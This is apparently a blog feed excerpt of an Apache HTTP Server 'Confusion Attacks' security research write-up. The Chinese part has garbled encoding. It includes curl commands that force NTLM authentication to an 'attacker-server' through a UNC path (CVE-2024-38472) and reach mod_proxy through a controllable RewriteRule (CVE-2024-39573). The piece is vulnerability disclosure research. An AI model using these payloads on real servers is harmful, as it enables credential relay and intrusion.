&lt;p&gt;æƒ³è¦ç›´æ¥é€é HTTP è«‹æ±‚è§¸ç™¼éœ€è¦åœ¨ Httpd ä¸­è¨­ç½®é¡å¤–çš„è¨­å®šï¼Œé›–ç„¶é€™å€‹è¨­å®šç¬¬ä¸€çœ¼çœ‹èµ·ä¾†æœ‰é»ä¸ç¾å¯¦ï¼Œä½†ä¼¼ä¹ç¶“å¸¸èˆ‡ Tomcat (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_jk&lt;/code&gt;ã€&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy_ajp&lt;/code&gt;) æˆ–æ˜¯èˆ‡ &lt;a href=&quot;https://httpd.apache.org/docs/2.4/en/mod/core.html#allowencodedslashes&quot;&gt;PATH_INFO&lt;/a&gt; ä¸€èµ·å‡ºç¾ï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AllowEncodedSlashes&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¦å¤–ç”±æ–¼ Httpd åœ¨ 2.4.49 å¾Œé‡å¯«äº†æ ¸å¿ƒ HTTP è«‹æ±‚è§£æå™¨é‚è¼¯ï¼Œè¦åœ¨å¤§æ–¼æ­¤ç‰ˆæœ¬çš„ Httpd ä¸Šè§¸ç™¼æ¼æ´éœ€è¦å†é¡å¤–åŠ ä¸Šä¸€å€‹è¨­å®šï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AllowEncodedSlashes&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
MergeSlashes &lt;span class=&quot;ss&quot;&gt;Off&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€éå…©å€‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%5C&lt;/code&gt; å¯ä»¥ä½¿å¼·è¿« Httpd å‘ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;attacker-server&lt;/code&gt; ç™¼èµ· NTLM èªè­‰ï¼Œå¯¦å‹™ä¸Šä¹Ÿå¯é€é &lt;a href=&quot;https://en.hackndo.com/ntlm-relay/&quot;&gt;NTLM Relay&lt;/a&gt; çš„æ–¹å¼å°‡æ­¤ SSRF è½‰åŒ–æˆ RCEï¼&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/%5C%5Cattacker-server/path/to
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;ï¸-é€é-type-map-è§¸ç™¼&quot;&gt;âœ”ï¸ é€é Type-Map è§¸ç™¼&lt;/h5&gt;

&lt;p&gt;&lt;a href=&quot;https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/mods-available/mime.conf/#L235&quot;&gt;Debian/Ubuntu çš„ Httpd ç™¼è¡Œç‰ˆ&lt;/a&gt;ä¸­é è¨­å•Ÿç”¨äº† Type-Mapï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddHandler&lt;/span&gt; type-map &lt;span class=&quot;ss&quot;&gt;var&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€éä¸Šå‚³ä¸€å€‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.var&lt;/code&gt; æª”æ¡ˆåˆ°ä¼ºæœå™¨ï¼Œå°‡å…¶ä¸­ URI æ¬„ä½æŒ‡å®šæˆ UNC è·¯å¾‘ä¹Ÿå¯å¼·è¿«ä¼ºæœå™¨å‘æ”»æ“Šè€…ç™¼èµ· NTLM èªè­‰ï¼Œé€™ä¹Ÿæ˜¯æˆ‘æ‰€æå‡ºçš„&lt;a href=&quot;https://github.com/orangetw/My-CTF-Web-Challenges?tab=readme-ov-file#ostyle&quot;&gt;ç¬¬äºŒå€‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.var&lt;/code&gt; å°æŠ€å·§&lt;/a&gt; ğŸ˜‰&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ï¸-cve-2024-39573---åŸºæ–¼-rewriterule-å‰ç¶´å¯å®Œå…¨æ§åˆ¶çš„-ssrf&quot;&gt;âš”ï¸ CVE-2024-39573 - åŸºæ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; å‰ç¶´å¯å®Œå…¨æ§åˆ¶çš„ SSRF&lt;/h4&gt;

&lt;p&gt;æœ€å¾Œå‰‡æ˜¯ç•¶ä½æ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server Config&lt;/code&gt; æˆ–æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualHost&lt;/code&gt; ä¸­çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; å‰ç¶´å®Œå…¨å¯æ§æ™‚ï¼Œå¯ä»¥å‘¼å«åˆ° Proxy ä»¥åŠç›¸é—œå­æ¨¡çµ„ï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/broken(.*) $1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€éä¸‹åˆ—ç¶²å€å¯å°‡è«‹æ±‚è½‰äº¤çµ¦ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; è™•ç†ï¼š&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/brokenproxy:unix:/run/[...]|http://path/to
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä½†å¦‚æœç¶²ç®¡æœ‰å¥½å¥½æ¸¬è©¦ï¼Œå°±æœƒç™¼ç¾é€™æ¨£å­çš„è¦å‰‡æ˜¯ä¸å¯¦éš›çš„ï¼Œæ‰€ä»¥åŸæœ¬åªæŠŠå®ƒç•¶æˆå¦å¤–ä¸€å€‹æ¼æ´çš„æ­é…çµ„åˆä¸€èµ·å›å ±ï¼Œæ²’æƒ³åˆ°é€™å€‹è¡Œç‚ºä¹Ÿè¢«ç•¶æˆä¸€å€‹å®‰å…¨é‚Šç•Œä¿®å¾©ã€‚ å†éš¨è‘—ä¿®è£œå‡ºä¾†å¾Œä¹Ÿçœ‹åˆ°å…¶ä»–ç ”ç©¶å“¡æŠŠåŒæ¨£è¡Œç‚ºå¥—ç”¨åœ¨ Windows UNC ä¸Šç²å¾—å¦å¤–ä¸€å€‹é¡å¤–çš„ CVEã€‚&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;æœªä¾†ç ”ç©¶æ–¹å‘&quot;&gt;æœªä¾†ç ”ç©¶æ–¹å‘&lt;/h2&gt;

&lt;p&gt;æœ€å¾Œæ˜¯é—œæ–¼é€™ä»½ç ”ç©¶çš„æœªä¾†çš„ä¸€äº›å±•æœ›ä»¥åŠå¯åŠ å¼·çš„åœ°æ–¹ï¼ŒåŸºæœ¬ä¸Š Confusion Attacks ä»ç„¶æ˜¯ä¸€å€‹å¾ˆæœ‰æ½›åŠ›çš„æ”»æ“Šé¢ï¼Œå°¤å…¶æ˜¯æˆ‘é€™æ¬¡çš„ç ”ç©¶ä¸»è¦ä¹Ÿåªå°ˆæ³¨åœ¨å…©å€‹æ¬„ä½ä¸Šè€Œå·²ï¼Œåªè¦ Apache HTTP Server æ²’æœ‰å¥½å¥½å¾åº•å±¤é€²è¡Œçµæ§‹æ€§åŠ å¼·æˆ–æä¾›çµ¦é–‹ç™¼è€…ä¸€å€‹å¥½çš„é–‹ç™¼æ¨™æº–ï¼Œç›¸ä¿¡æœªä¾†é‚„æœƒæœ‰æ›´å¤šã€Œæ··æ·†ã€å‡ºç¾ï¼&lt;/p&gt;

&lt;p&gt;è‡³æ–¼é‚„æœ‰å“ªäº›æ–¹é¢å¯ä»¥åŠ å¼·å‘¢ï¼Ÿ å…¶å¯¦ä¸åŒçš„ Httpd ç™¼è¡Œç‰ˆæœƒæœ‰ä¸åŒçš„è¨­å®šæª”æ¡ˆï¼Œå› æ­¤å…¶å®ƒçš„ Unix-Like ç³»çµ±ä¾‹å¦‚ RHEL å®¶æ—ã€BSD ç³»åˆ—ï¼Œç”šè‡³ä½¿ç”¨åˆ° Httpd çš„å¥—è£è»Ÿé«”ï¼Œå®ƒå€‘éƒ½æœ‰æ©Ÿæœƒå‡ºç¾æ›´å¤šå¯è·³è„«çš„é‡å¯«è¦å‰‡ã€æ›´å¤šå²å®³çš„ Local Gadgets ç”šè‡³æ„æ–™å¤–çš„ç¬¦è™Ÿè·³èºç­‰ç­‰ ï¼Œå°±äº¤çµ¦æœ‰èˆˆè¶£çš„äººç¹¼çºŒå§ã€‚&lt;/p&gt;

&lt;p&gt;æœ€å¾Œç”±æ–¼æ™‚ç¨‹å› ç´ ï¼Œä¾†ä¸åŠåˆ†äº«æ›´å¤šåœ¨å¯¦éš›ç¶²ç«™ã€è¨­å‚™ï¼Œç”šè‡³é–‹æºå°ˆæ¡ˆä¸Šç™¼ç¾ä¸¦åˆ©ç”¨çš„çœŸå¯¦æ¡ˆä¾‹ï¼Œä¸éä½ æ‡‰è©²å·²ç¶“å¯ä»¥æƒ³åƒ â€”â€” åœ¨çœŸå¯¦ä¸–ç•Œä¸­çµ•å°é‚„è—è‘—åƒåƒè¬è¬å€‹æ¯”æƒ³åƒä¸­é‚„è¦å¤§é‡æœªé–‹æ¡çš„è¦å‰‡ã€å¯ç¹éçš„èªè­‰ï¼Œä»¥åŠéš±è—åœ¨æª¯é¢ä¸‹çš„ CGIï¼Œè‡³æ–¼å¦‚ä½•æŠŠé€™ç¯‡è£¡é¢æ‰€è¬›åˆ°çš„æŠ€å·§å¯¦éš›æ‡‰ç”¨åœ¨å…¨ä¸–ç•Œä¸Šï¼Ÿ æ¥ä¸‹ä¾†å°±æ˜¯ä½ å€‘çš„ä»»å‹™äº†ï¼&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;çµèª&quot;&gt;çµèª&lt;/h2&gt;

&lt;p&gt;ç¶­è­·ä¸€å€‹ Open Source å°ˆæ¡ˆçœŸçš„æ˜¯ä¸€ä»¶å¾ˆå›°é›£çš„äº‹ï¼Œå°¤å…¶åœ¨è®“ä½¿ç”¨è€…æ–¹ä¾¿çš„åŒæ™‚å…¼é¡§èˆŠç‰ˆæœ¬çš„ç›¸å®¹æ€§ï¼Œç¨æœ‰ä¸æ…å¯èƒ½å°±æœƒé€ æˆæ•´å€‹ç³»çµ±è¢«æ”»ç ´ (ä¾‹å¦‚ Httpd 2.4.49 ä¸­å› ç‚ºä¸€å€‹è·¯å¾‘è™•ç†é‚è¼¯å°æ”¹å‹•å°è‡´ç½é›£æ€§çš„ &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773&quot;&gt;CVE-2021-41773&lt;/a&gt;)ï¼Œæ•´å€‹é–‹ç™¼éç¨‹å¿…é ˆè¦å°å¿ƒç¿¼ç¿¼çš„è¸©åœ¨ä¸€å †éºç•™ç¨‹å¼ç¢¼ä»¥åŠæŠ€è¡“å‚µä¸Šã€‚ æ‰€ä»¥å¦‚æœçœŸçš„æœ‰ Apache HTTP Server çš„é–‹ç™¼è€…çœ‹åˆ°é€™ç¯‡æ–‡æˆ‘æƒ³èªªï¼š è¬è¬ä½ å€‘çš„è²¢ç»ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server/</link>
                <guid>https://devco.re/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server</guid>
                <pubDate>Fri, 09 Aug 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!</title>
                <description>&lt;h6 id=&quot;orange-tsai-orange_8361--ç¹é«”ä¸­æ–‡ç‰ˆæœ¬--english-version&quot;&gt;Orange Tsai (&lt;a href=&quot;https://x.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;) Â |Â  &lt;a href=&quot;/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server/&quot;&gt;ç¹é«”ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt; Â |Â  &lt;a href=&quot;/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-en/&quot;&gt;English Version&lt;/a&gt;&lt;/h6&gt;

&lt;style&gt;
    .language-plaintext {
        background-color: #f9f2f4;
    }

    .highlight {
        border-left: 2px solid #44D62C !important;
    }
&lt;/style&gt;

&lt;p&gt;Hey there! This is my research on Apache HTTP Server presented at &lt;a href=&quot;https://www.blackhat.com/us-24/briefings/schedule/index.html#confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-pre-recorded-40227&quot;&gt;Black Hat USA 2024&lt;/a&gt;. Additionally, this research will also be presented at &lt;a href=&quot;https://hitcon.org/2024/CMT/agenda/eff94e55-3f1d-4229-a65a-65ade9524421/&quot;&gt;HITCON&lt;/a&gt; and &lt;a href=&quot;https://orangecon.nl/&quot;&gt;OrangeCon&lt;/a&gt;. If youâ€™re interested in getting a preview, you can check the slides here:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://i.blackhat.com/BH-US-24/Presentations/US24-Orange-Confusion-Attacks-Exploiting-Hidden-Semantic-Thursday.pdf&quot;&gt;Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Also, I would like to thank Akamai for their friendly outreach! They released mitigation measures immediately after this research was published (details can be found on &lt;a href=&quot;https://www.akamai.com/blog/security-research/2024-august-apache-waf-proactive-collaboration-orange-tsai-devcore&quot;&gt;Akamaiâ€™s blog&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;

&lt;p&gt;This article explores architectural issues within the Apache HTTP Server, highlighting several technical debts within Httpd, &lt;strong&gt;including 3 types of Confusion Attacks, 9 new vulnerabilities, 20 exploitation techniques, and over 30 case studies&lt;/strong&gt;. The content includes, but is not limited to:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;How a single &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; can bypass Httpdâ€™s built-in access control and authentication.&lt;/li&gt;
  &lt;li&gt;How unsafe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRules&lt;/code&gt; can escape the Web Root and access the entire filesystem.&lt;/li&gt;
  &lt;li&gt;How to leverage a piece of code from 1996 to transform an XSS into RCE.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;outline&quot;&gt;Outline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#before-the-story&quot;&gt;Before the Story&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#how-did-the-story-begin&quot;&gt;How Did the Story Begin?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#why-apache-http-server-smells-bad&quot;&gt;Why Apache HTTP Server Smells Bad?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#a-whole-new-attack--confusion-attack&quot;&gt;A Whole New Attack â€” Confusion Attack&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#-1-filename-confusion&quot;&gt;1. Filename Confusion&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-1-1-truncation&quot;&gt;Primitive 1-1. Truncation&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-1-1-1-path-truncation&quot;&gt;1-1-1. Path Truncation&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-1-1-2-mislead-rewriteflag-assignment&quot;&gt;1-1-2. Mislead RewriteFlag Assignment&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-1-2-acl-bypass&quot;&gt;Primitive 1-2. ACL Bypass&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#-2-documentroot-confusion&quot;&gt;2. DocumentRoot Confusion&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-2-1-server-side-source-code-disclosure&quot;&gt;Primitive 2-1. Server-Side Source Code Disclosure&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-1-1-disclose-cgi-source-code&quot;&gt;2-1-1. Disclose CGI Source Code&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-1-2-disclose-php-source-code&quot;&gt;2-1-2. Disclose PHP Source Code&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-2-2-local-gadgets-manipulation&quot;&gt;Primitive 2-2. Local Gadgets Manipulation!&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-1-local-gadget-to-information-disclosure&quot;&gt;2-2-1. Local Gadget to Information Disclosure&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-2-local-gadget-to-xss&quot;&gt;2-2-2. Local Gadget to XSS&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-3-local-gadget-to-lfi&quot;&gt;2-2-3. Local Gadget to LFI&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-4-local-gadget-to-ssrf&quot;&gt;2-2-4. Local Gadget to SSRF&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-5-local-gadget-to-rce&quot;&gt;2-2-5. Local Gadget to RCE&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-2-3-jailbreak-from-local-gadgets&quot;&gt;Primitive 2-3. Jailbreak from Local Gadgets&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-3-1-jailbreak-from-local-gadgets&quot;&gt;2-3-1. Jailbreak from Local Gadgets&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-3-2-jailbreak-local-gadgets-to-redmine-rce&quot;&gt;2-3-2. Jailbreak Local Gadgets to Redmine RCE&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#-3-handler-confusion&quot;&gt;3. Handler Confusion&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-3-1-overwrite-the-handler&quot;&gt;Primitive 3-1. Overwrite the Handler&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-1-1-overwrite-handler-to-disclose-php-source-code&quot;&gt;3-1-1. Overwrite Handler to Disclose PHP Source Code&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-1-2-overwrite-handler-to---&quot;&gt;3-1-2. Overwrite Handler to â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-3-2-invoke-arbitrary-handlers&quot;&gt;Primitive 3-2. Invoke Arbitrary Handlers&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-1-arbitrary-handler-to-information-disclosure&quot;&gt;3-2-1. Arbitrary Handler to Information Disclosure&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-2-arbitrary-handler-to-misinterpret-scripts&quot;&gt;3-2-2. Arbitrary Handler to Misinterpret Scripts&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-2-arbitrary-handler-to-full-ssrf&quot;&gt;3-2-2. Arbitrary Handler to Full SSRF&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-3-arbitrary-handler-to-access-local-unix-domain-socket&quot;&gt;3-2-3. Arbitrary Handler to Access Local Unix Domain Socket&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-4-arbitrary-handler-to-rce&quot;&gt;3-2-4. Arbitrary Handler to RCE&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#-4-other-vulnerabilities&quot;&gt;4. Other Vulnerabilities&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-cve-2024-38472---windows-unc-based-ssrf&quot;&gt;CVE-2024-38472 - Windows UNC-based SSRF&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-triggered-via-http-request-parser&quot;&gt;Triggered via HTTP Request Parser&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-triggered-via-type-map&quot;&gt;Triggered via Type-Map&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-cve-2024-39573---ssrf-via-full-control-of-rewriterule-prefix&quot;&gt;CVE-2024-39573 - SSRF via Full Control of RewriteRule Prefix&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#future-works&quot;&gt;Future Works&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;before-the-story&quot;&gt;Before the Story&lt;/h2&gt;

&lt;p&gt;This section is just some personal murmurs. If youâ€™re only interested in the technical details, jump straight to â€” &lt;a href=&quot;#how-did-the-story-begin&quot;&gt;How Did the Story Begin?&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As a researcher, perhaps the greatest joy is seeing your work recognized and understood by peers. Therefore, after completing a significant research with fruitful results, it is natural to want the world to see it â€” which is why Iâ€™ve presented multiple times at Black Hat USA and DEFCON. As you might know, since 2022, I have been unable to obtain a valid travel authorization to enter the U.S. (For Taiwan, travel authorization under the &lt;a href=&quot;https://esta.cbp.dhs.gov/&quot;&gt;Visa Waiver Program&lt;/a&gt; can typically be obtained online within minutes to hours), leading me to miss the in-person talk at &lt;a href=&quot;https://www.blackhat.com/us-22/briefings/schedule/index.html#lets-dance-in-the-cache---destabilizing-hash-table-on-microsoft-iis-27199&quot;&gt;Black Hat USA 2022&lt;/a&gt;. Even a solo trip to Machu Picchu and Easter Island in 2023 couldnâ€™t transit through the U.S. :(&lt;/p&gt;

&lt;p&gt;To address this situation, I started preparing for a B1/B2 visa in January this year, writing various documents, interviewing at the embassy, and endlessly waiting. Itâ€™s not fun. But to have my work seen, I still spent a lot of time seeking all possibilities, even until three weeks before the conference, it was unclear whether my talk would be canceled or not (BH only accepted in-person talks, but thanks to the RB, it could ultimately be presented in pre-recorded format). So, everything you see, including slides, videos, and this blog, was completed within just a few dozen days. ğŸ˜–&lt;/p&gt;

&lt;p&gt;As a pure researcher with a clear conscience, my attitude towards vulnerabilities has always been â€” they should be directly reported to and fixed by the vendor. Writing these words isnâ€™t for any particular reason, just to record some feelings of helplessness, efforts in this year, and to thank those who have helped me this year, thank you all :)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;how-did-the-story-begin&quot;&gt;How Did the Story Begin?&lt;/h2&gt;

&lt;p&gt;Around the beginning of this year, I started thinking about my next research target. As you might know, I always aim to challenge big targets that can impact the entire internet, so I began searching for some complex topics or interesting open-source projects like Nginx, PHP, or even delved into RFCs to strengthen my understanding of protocol details.&lt;/p&gt;

&lt;p&gt;While most attempts ended in failure (though a few might become topics for next blog posts ğŸ˜‰), reading these codes reminded me of a quick review I had done of Apache HTTP Server last year! Although I didnâ€™t dive deep into the code due to the work schedule, I had already â€œsmelledâ€ something not quite right about its coding style at that time.&lt;/p&gt;

&lt;p&gt;So this year, I decided to continue on that research, transforming the â€œbad smellsâ€ from an indescribable â€œfeelingâ€ into concrete research on Apache HTTP Server!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;why-apache-http-server-smells-bad&quot;&gt;Why Apache HTTP Server Smells Bad?&lt;/h2&gt;

&lt;p&gt;Firstly, the Apache HTTP Server is a world constructed by â€œmodules,â€ as proudly declared in its &lt;a href=&quot;https://httpd.apache.org/docs/2.4/mpm.html&quot;&gt;official documentation&lt;/a&gt; regarding its modularity:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Apache httpd has always accommodated a wide variety of environments through its modular design. [â€¦] Apache HTTP Server 2.0 extends this modular design to the most basic functions of a web server.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The entire Httpd service relies on hundreds of small modules working together to handle a clientâ€™s HTTP request. &lt;strong&gt;Among the &lt;a href=&quot;https://httpd.apache.org/docs/2.4/mod/&quot;&gt;136 modules listed by the official documentation&lt;/a&gt;, about half are either enabled by default or frequently used by websites&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;Whatâ€™s even more surprising is that these modules also maintain a colossal &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request_rec&lt;/code&gt; structure while processing client HTTP requests. This structure includes all the elements involved in handling HTTP, with its detailed definition available in &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/include/httpd.h#L838&quot;&gt;include/httpd.h&lt;/a&gt;. All modules depend on this massive structure for synchronization, communication, and data exchange. As an HTTP request passes through several phases, modules act like players in a game of catch, passing the structure from one to another. Each module even has the ability to modify any value in this structure according to its own preferences!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This type of collaboration is not new from a software engineering perspective. Each module simply focuses on its own task. As long as everyone finishes their work, then the client can enjoy the service provided by Httpd. This approach might work well with a few modules, &lt;strong&gt;but what happens when we scale it up to hundreds of modules collaborating â€” can they really work  well together?&lt;/strong&gt; ğŸ¤”&lt;/p&gt;

&lt;p&gt;Our starting point is straightforward â€” &lt;strong&gt;the modules do not fully understand each other, yet they are required to cooperate&lt;/strong&gt;. Each module might be implemented by different people, with the code undergoing years of iterations, refactors, and modifications. Do they really still know what they are doing? Even if they understand their own duty, what about other modulesâ€™ implementation details? Without any good development standards or guidelines, there must be several gaps that we can exploit!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

